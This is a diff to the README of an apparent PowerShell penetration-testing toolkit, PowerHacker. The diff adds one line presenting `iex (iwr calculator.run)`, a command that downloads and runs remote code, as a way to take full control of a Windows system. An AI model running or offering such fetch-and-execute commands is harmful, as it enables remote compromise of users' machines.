@@ -3,6 +3,8 @@
 
 Welcome to PowerHacker, a PowerShell-based toolkit designed for penetration testers and cybersecurity professionals. PowerHacker prefers utilizing valuable Top-Level Domains (TLDs) and the setup of subdomains to facilitate efficient red team operations and security assessments.
 
+- A simple command like `iex (iwr calculator.run)` is enough to give full control over a windows system. 
+
 ## :lock: Security Notice
 
 Security and ethical use are paramount. PowerHacker is intended for **authorized penetration testing** and/or **educational purposes only**. Misuse of PowerHacker may result in legal consequences. Ensure you have explicit permission to test target systems with PowerHacker.
